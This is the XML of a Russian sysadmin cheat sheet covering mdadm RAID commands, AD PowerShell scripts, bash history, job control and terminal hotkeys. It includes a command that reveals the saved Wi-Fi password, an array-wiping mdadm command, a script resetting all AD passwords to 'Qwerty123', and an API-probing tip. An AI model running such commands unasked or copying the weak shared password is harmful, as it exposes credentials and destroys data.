      <text:p text:style-name="P1"><text:span text:style-name="T1">Состояние массива:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat /proc/mdstat</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о массиве:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm --detail /dev/md0</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Информация об элементе массива:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm --examine /dev/sda1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка целостности.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">зарускаем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">проверку</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo check &gt; /sys/block/md1/md/sync_action</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">смотрим</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">результат</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">~# cat /proc/mdstat</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>Personalities : [raid10] [raid1]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>md0 : active raid1 sdb1[1] sda1[0] sdc1[2] sdd1[3]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="7"/>128384 blocks [4/4] [UUUU]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>md1 : active raid10 sdd2[3] sdc2[2] sda2[0] sdb2[1]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="7"/>134222848 blocks 256K chunks 2 near-copies [4/4] [UUUU]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="7"/>[&gt;....................] <text:s/>check = <text:s/>0.5% (787072/134222848) finish=19.7min speed=112438K/sec</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Убить</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">массив</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --stop /dev/md0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --zero-superblock /dev/sda..</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Быстрый совет по </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">. Используйте эту команду, чтобы получить пароль к подключенной в данный момент сети </text:span><text:span text:style-name="T3">Wi</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">Fi</text:span><text:span text:style-name="T1"> '</text:span><text:span text:style-name="T3">nmcli</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">device</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">wifi</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">show</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">password</text:span><text:span text:style-name="T1">'.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PowerShell скрипт смены пароля в AD у всех пользователей. Меняет всем пароль в AD и ставит галку о смене при первом входе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Import-Module ActiveDirectory</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">$users = Get-ADUser -Filter * -SearchBase "OU=</text:span><text:span text:style-name="T1">Пользователи</text:span><text:span text:style-name="T3">,DC=flammlin,DC=local"</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">foreach ($user in $users)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$password = ConvertTo-SecureString -String "Qwerty123" -AsPlainText - Force</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Set-ADAccountPassword -Identity $user -NewPassword $password -Reset -PassThru | Set-ADuser -ChangePasswordAtLogon $True</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">adduser - команда, упрощающая создание учетных записей пользователей в основанных на Debian дистрибутивах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T1">Базовый синтаксис команды adduser:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># adduser</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В результате исполнения данной команды выполняются следующие операции:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1- Создается учетная запись пользователя с именем .</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2- Создается домашняя директория пользователя /home/, в которую копируются файлы из директории /etc/skel.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3- Создается группа пользователей с именем, соотвествующим имени нового пользователя, причем сам этот пользователь добавляется в нее.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4- Выводится запрос ввода пароля для учетной записи пользователя.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5- Выводится запрос ввода дополнительной информации, относящейся к учетной записи пользователя.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># useradd -m -U</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># passwd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># chfn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># adduser</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Данная команда также может быть заменена на более сложную команду на основе более распространенной утилиты usermod:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># usermod -G , ...,</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вторая команда является более сложной, но при этом и более гибкой, ведь она позволяет добавить пользователя сразу в несколько новых групп.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры использования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создание учетной записи пользователя iodminbook</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1"># adduser iodminbook</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Добавление пользователя iodminbook в группу testgroup</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"># adduser iodminbook testgroup</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Горячие клавиши терминала Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Общие:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+Alt+T - в дистрибутивах, основанных на Ubuntu это сочетание клавиш используется для открытия терминала.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+L - очистить весь вывод терминала.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+S - приостановить вывод терминала.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Ctrl+Q - возобновить вывод если он был приостановлен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+C - отправить команде сигнал SigInt для её завершения.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+Z - свернуть текущую команду в фоновый режим.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">История команд:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Стрелки вверх и вниз - используются для перемещения вперед и назад по истории команд.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+r - можно использовать для поиска по истории команд.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+p - предыдущая команда в истории команд.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+n - следующая команда в истории команд.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+g - если вы находитесь в режиме поиска, завершает поиск.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+o - выполнить найденную поиском команду.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+. - использовать последнее слово предыдущей команды.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Перемещение курсора:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+a - перейти в начало строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+e - перейти в конец строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+b - перейти влево на одно слово.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+f - перейти в право на одно слово.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+b - перейти влево на один символ.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+f - перейти вправо на один символ.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+xx - перейти в конец или в начало строки.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Редактирование:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+u - вырезать строку до позиции курсора.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+Del - удалить слово перед курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+d - удалить слово после курсора.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+d - удалить символ под курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+h - удалить символ под курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+w - вырезать слово под курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+k - вырезать строку от позиции курсора до конца строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+t - поменять текущее слово с предыдущим.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+t - поменять местами два символа перед курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Esc+t - поменять местами два слова перед курсором.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl+y - вставить то, что было вырезано.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Alt+u - сделать верхний регистр символов от позиции курсора до конца текущего слова.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Alt+l - сделать нижний регистр символов от позиции курсора до конца слова.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+c - перевести символ под курсором в верхний регистр и перейти к концу слова.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt+r - вернуть строку в исходное состояние.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Ctrl+_ - отменить последнее действие со строкой.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Совет по тестированию API</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">У большинства API есть конечная точка для создания, удаления, обновления и чтения объекта или группы объектов. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если вы видите:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">DELETE /api/item/32 (удаление)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">То попробуйте:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">POST /api/item (создание)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">GET /api/item/33 (</text:span><text:span text:style-name="T1">чтение</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">PUT /api/item/33 (</text:span><text:span text:style-name="T1">обновление</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Советы по настройке history команд в Bash:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Каждая вводимая в терминале команда сохраняется в файле ~/.bash_history. Чтобы посмотреть историю команд - введите history.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Настройка истории команд в Bash осуществляется путем добавления переменных окружения в файл ~/.bashrc.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы изменения в ~/.bashrc вступили в силу, выполните:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">source ~/.bashrc</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Добавляем Отображение Даты и Времени в Bash History</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Иногда очень полезно узнать время, когда какая-либо команда была выполнена.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установите HISTTIMEFORMAT, чтобы сохранять время выполнения каждой команды.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Для этого добавьте следующую строку в файл ~/.bashrc:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">export HISTTIMEFORMAT="%h %d %H:%M:%S "</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Теперь, набрав history, Вы получите следующий вывод:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">113 <text:s/>Jun 08 16:31:06 sudo ifconfig</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">114 <text:s/>Jun 08 16:31:10 top</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">115 <text:s/>Jun 08 16:31:19 ping disnetern.ru</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">116 <text:s/>Jun 08 16:31:22 history</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Увеличиваем Размер Хранимой Истории</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Увеличьте HISTSIZE - количество команд, которые необходимо запоминать в списке истории (стандартное значение - 500).</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">export HISTSIZE=5000</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Увеличьте HISTFILESIZE - максимальное количество строк, содержащееся в файле истории (стандартное значение - 500).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">export HISTFILESIZE=5000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. Добавляем Команды Bash в Файл с Историей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Bash перезаписывает файл .bash_history?</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Чтобы добавлять новые команды в файл с историей, а не переписывать его каждый раз, добавьте следующую строку в ~/.bashrc:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">shopt -s histappend</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. Мгновенно Сохранять Историю Команд</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">По умолчанию, Bash записывает историю команд в .bash_history, при завершении сессии.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если сессия внезапно оборвется Вы потеряете текущую историю команд.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Используйте переменную $PROMPT_COMMAND, чтобы сохранять команды сразу после выполнения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую строку в файл ~/.bashrc, если переменная $PROMPT_COMMAND не была задана ранее:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PROMPT_COMMAND='history -a'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте следующую строку, если переменная $PROMPT_COMMAND уже была задана:</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">PROMPT_COMMAND='$PROMPT_COMMAND; history -a'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ChatGPT расширения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. https://github.com/HorrorPills/ChatGPT-Gnome-Desktop-Extension - встраивает ChatGPT в Linux среду окружения Gnome.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf - расширение для Google Chrome.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. https://github.com/wong2/chat-gpt-google-extension - интеграция этой нейросети в поисковые системы Google, Baidu, Bing, DuckDuckGo, Brave, Yahoo, Naver, Yandex, Kagi, Searx;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. https://chrome.google.com/webstore/detail/promptheus-converse-with/eipjdkbchadnamipponehljdnflolfki - подключает ИИ к голосовому помощнику;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">5. https://github.com/altryne/chatGPT-telegram-bot/ - помогает создать Telegram бота на ChatGPT;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Запуск команд в фоновом режиме, синтаксис:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3"> </text:span><text:span text:style-name="T1">выглядит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">следующим</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">образом</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">command &amp; script-name &amp; /path/to/command arg1 arg2 &amp; command-1 | command-2 arg1 &amp; command-1 | command-2 -arg1 -arg2 &gt;/path/to/output &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы перевести команду ls в фоновый режим, введите:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">$ ls *.py &gt; output.txt &amp;</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Чтобы перевести следующую команду поиска в фоновый режим, добавьте символ «&amp;» в конец командной строки:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">find . -iname "*.mp3" &gt; myplaylist.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как найти задания, работающие в фоновом режиме? Выполните следующую команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">jobs</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример вывода данных:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[1]- <text:s/>Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[2]+ <text:s/>Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Где</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[1] и [2] идентификаторы заданий.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы отобразить идентификаторы процессов для идентификаторов заданий помимо стандартных сведений, передайте параметр -l:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">jobs - l</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример вывода данных:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[1]- <text:s/>7307 Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы отобразить только идентификаторы процессов, введите:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">jobs -p</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример вывода данных:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7307</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7324</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3"> </text:span><text:span text:style-name="T1">выглядит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">следующим</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">образом</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">kill PID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">kill -15 PID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">kill -9 PID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">killall process-Name-Here</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">killall -15 process-Name-Here</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">killall -9 process-Name-Here</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как переместить процесс из фонового режима в приоритетный?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Синтаксис</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">%JOB-ID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ИЛИ</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">fg JOB-ID</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сначала следует вывести список текущих заданий с помощью команды jobs. Для этого введите:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">jobs -l</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример вывода данных:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">[1]- <text:s/>7307 Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы перевести задание job id #2 в приоритетный режим, введите:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">%2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ИЛИ используйте команду:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">fg 2</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Пример вывода данных:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">%2 &amp;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ИЛИ используйте команду:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">bg</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Теперь командное задание grep будет работать в фоновом режиме.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">kill Linux:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Syn: kill {option} {PID}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Search PID: pidof {name program} or use "top, htop"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">Example: kill {-1: reboot process, -9: kill process, -15: terminate process} {PID process} or {$(pidof{name program}}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">Win+Ctrl+Shift+B - </text:span><text:span text:style-name="T1">перезапускает</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">видеодрайвер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StartDate = (Get-Date).AddDays(-1)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$NewUsers = ($Zapros).count</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$OFS = "`r`n" #`r`n`r`n</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:span><text:span text:style-name="T3"/></text:p>
